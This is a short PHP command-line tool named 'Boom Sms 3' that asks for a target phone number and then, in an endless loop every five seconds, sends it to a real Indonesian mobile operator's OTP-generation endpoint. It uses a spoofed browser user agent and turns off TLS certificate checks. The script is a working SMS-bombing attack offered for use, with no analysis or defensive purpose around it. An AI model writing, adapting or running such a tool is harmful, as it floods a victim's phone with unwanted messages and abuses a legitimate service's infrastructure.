<?php
system("clear");
function main($target){

        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, "https://registrasi.tri.co.id/daftar/generateotp");
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 6.0; i5K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$target");
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        $x = curl_exec($ch);
        curl_close($ch);
        echo $x;

    }
 echo "
 _                                           ,_____________,
| |__   ___  _ __ ___  _ __ ___   ___ _ __   |BOM-------SMS|
|  _ \ / _ \|  _   _ \|  _   _ \ / _ \  __|  |----v.1.0----|
| |_) | (_) | | | | | | | | | | |  __/ |     |_____________|
|_ __/ \___/|_| |_| |_|_| |_| |_|\___|_| _ _ _ / /
 =====================================   _ _ _ _/
||  AUTHOR   :   CoDeX01    ||
||  Script   :   Boom Sms 3          ||
 =====================================
";
 echo "\n";
 echo "Masukkan Nomor Target :";
 $nomor = trim(fgets(STDIN));
while(true){ 
$execute = main($nomor);
 print $execute;
 echo "\n";
 sleep(5);
}


?>
